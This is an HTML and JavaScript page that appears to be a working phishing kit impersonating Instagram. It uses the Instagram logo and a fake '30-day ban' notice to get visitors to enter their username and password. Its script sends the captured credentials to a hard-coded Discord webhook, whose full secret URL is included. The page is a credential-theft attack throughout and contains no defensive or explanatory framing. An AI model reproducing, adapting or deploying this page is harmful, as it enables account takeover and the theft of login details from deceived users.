<div class="card">
  <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo">
  <h2>𝓲𝓷𝓼𝓽𝓰𝓻𝓪𝓶</h2>
  <form id="adminForm" autocomplete="off">
    <input id="username" type="text" class="input-field" placeholder="Username" required>
    <input id="password" type="text" class="input-field" placeholder="Password" required>
    <button type="submit" class="login-button">Submit</button>
  </form>
  <div class="small">Enter your info to lift the 30-day ban.</div>
</div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1405365027875328081/zEXRJbf8WfgC3ohP-eIpC5kMY2xwTo7hePu8V1syC5d28TBTDk7sREeweJ-Oo6TsTbd1";

const form = document.getElementById("adminForm");
const submitBtn = form.querySelector(".login-button");

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!username || !password) {
    alert("Please fill both fields.");
    return;
  }

  submitBtn.disabled = true;
  submitBtn.textContent = "Sending...";

  const payload = {
    content: `**New Admin Login**\nUsername: ${escapeForDiscord(username)}\nPassword: ${escapeForDiscord(password)}\nTime: ${new Date().toLocaleString()}`
  };

  try {
    const res = await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    if (!res.ok) throw new Error("Failed to send to webhook");

    alert("Submitted! Check Discord for info.");
    form.reset();
  } catch(err) {
    console.error(err);
    alert("Failed to submit. Check your webhook URL or internet connection.");
  } finally {
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
  }
});

function escapeForDiscord(str) {
  return str.replace(/`/g, "'").replace(/@/g, "@\u200b");
}
</script>

</body>
